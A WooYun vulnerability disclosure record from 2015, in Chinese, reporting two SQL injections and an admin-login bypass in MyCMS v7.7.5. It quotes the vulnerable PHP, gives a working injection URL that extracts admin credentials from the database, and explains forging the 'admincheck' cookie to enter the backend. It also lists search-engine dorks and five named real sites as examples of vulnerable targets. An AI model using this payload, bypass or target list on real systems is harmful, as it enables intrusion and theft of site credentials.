{"id": 38691, "wybug_id": "wooyun-2015-095700", "wybug_title": "MyCMS v7.7.5_UTF-8 sql注入等问题", "wybug_corp": "MyCMS", "wybug_author": "roker", "wybug_date": "2015-02-11 15:48", "wybug_open_date": "2015-04-30 18:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-30：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 用户量还不错的一个看电影和有声小说的cms两处sql注入+绕过安全码进入后台。官网demo. 详细说明：  第一处注入。/plus/mood/index.php\n$action = be(\"get\", \"action\");$m_vid = be(\"all\", \"m_vid\");$m_type = be(\"all\", \"m_type\");if (!isNum($m_vid)){ echo \"非法访问\";exit; }If (!isNum($m_type)) { echo \"非法访问\";exit; }........function show(){\tglobal $m_vid,$m_type,$db;\t$row = $db->getRow(\"SELECT * FROM {pre}mood WHERE m_vid=\" . $m_vid . \" AND m_type=\" . $m_type);\tif ($row){\t\t$mood1 = $row[\"mood1\"];\t\t$mood2 = $row[\"mood2\"];\t\t$mood3 = $row[\"mood3\"];\t\t$mood4 = $row[\"mood4\"];\t\t$mood5 = $row[\"mood5\"];\t\t$mood6 = $row[\"mood6\"];\t\t$mood7 = $row[\"mood7\"];\t\t$mood8 = $row[\"mood8\"];\t\t$mood9 = $row[\"mood9\"];\t\techo \"\" . $mood1 . \",\" . $mood2 . \",\" . $mood3 . \",\" . $mood4 . \",\" . $mood5 . \",\" . $mood6 . \",\" . $mood7 . \",\" . $mood8 . \",\" . $mood9 . \"\";    }    else{\t\t$db->Add (\"{pre}mood\", array(\"m_vid\", \"m_type\"), array($m_vid, $m_type));        echo \"0,0,0,0,0,0,0,0,0\";    }    unset($row);}    function mood(){\tglobal $m_vid,$m_type,$db;\t$typee = be(\"get\", \"typee\");\t\tif (isN($typee)){ echo \"非法访问\";exit;}\t$db->query(\"Update {pre}mood set \" . $typee . \"=\" . $typee . \"+1 where m_vid=\" . $m_vid . \" and m_type=\" . $m_type);\tshow();}\n只对 m_vid 和m_type 做了判断。typee 没有单引号包裹。导致注入。因为uptate 后进入了 show(), 将数据显示出来了，所以可以直接出数据。不过字段是 int的 所以要先转换为 asc码。栗子：\n\n\nplus/mood/index.php?m_vid=1&m_type=1&action=mood&typee=mood1=(select ord(substring(concat(m_name,m_password),1,1)) from mac_manager limit 1) where m_vid=1 and m_type=1%23\n将a的asc码显示出来了。脚本跑下就出来了。#2 /plus/digg/index.php\n$action = be(\"get\", \"action\");$d_vid = be(\"get\", \"d_vid\");$d_type = be(\"get\", \"d_type\");if (!isNum($d_vid)) { echo \"非法访问\" ; exit;}if (!isNum($d_type)) { echo \"非法访问\"; exit;}........function digg(){\tglobal $db,$d_vid,$d_type;\t$typee = be(\"get\", \"typee\");\tif (isN($typee)){ echo \"非法访问\"; exit;}\tif (getCookie(\"voddigg_\" . $d_vid)== \"ok\"){ echo \"1\"; exit;}\t$db->query(\"Update {pre}vod set \" . $typee . \"=\" . $typee . \"+1 where d_id=\" . $d_vid);\tsCookie (\"voddigg_\" . $d_vid, \"ok\");}\n同样，忘记对 typee过滤了，造成注入。现在 问题来了这个cms有安全码，所以解出了管理密码 也不能进后台。看看他的判断函数\nfunction chkLogin(){\tglobal $db;\t$m_id = getCookie(\"adminid\");\t$m_id = chkSql($m_id,true);\t$m_name = getCookie(\"adminname\");\t$m_name = chkSql($m_name,true);\t\tif (!isN($m_name) && !isN($m_id)){\t\t$row = $db->getRow(\"SELECT * FROM {pre}manager WHERE m_name='\" . $m_name .\"' AND m_id= '\".$m_id .\"' AND m_status ='1'\");\t\tif($row){\t\t\t$loginValidate = md5($row[\"m_random\"] . $row[\"m_name\"] . $row[\"m_id\"]);\t\t\tif (getCookie(\"admincheck\") != $loginValidate){ \t\t\t   sCookie (\"admincheck\",\"\");\t\t\t   die( \"<script>top.location.href='index.php?action=login';</script>\");\t\t\t}\t\t}\t\telse{\t\t\tsCookie (\"admincheck\",\"\");\t\t    die(\"<script>top.location.href='index.php?action=login';</script>\");\t\t}\t}\telse{\t\tdie(\"<script>top.location.href='index.php?action=login';</script>\");\t}}\ncookie验证。 只要得到 $row[\"m_random\"] . $row[\"m_name\"] . $row[\"m_id\"]的值 就能进入后台了。这个值 可以用第一处的注入把它显示出来。 官网为例(poc见测试代码。)\n\n修改 cookie值 ，\n\n成功进入后台~关键字 inurl:\"/vodplay/?.html\"inurl:\"vodlist/?.html\"感觉用户量蛮多的样子~随意5个例子http://www.86usd.com/http://www.yinyangshi.com/http://756k.com/http://dy.huaididi.net/http://www.huarenys.cc\n\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  过滤下~   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2015-02-11 15:49 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  给跪了    \n     2015-07-14 00:34 |    \t\t！毁灭！ \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 我的人生 没有简要介绍 全是一笔带过)\t\t \n  厉害    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}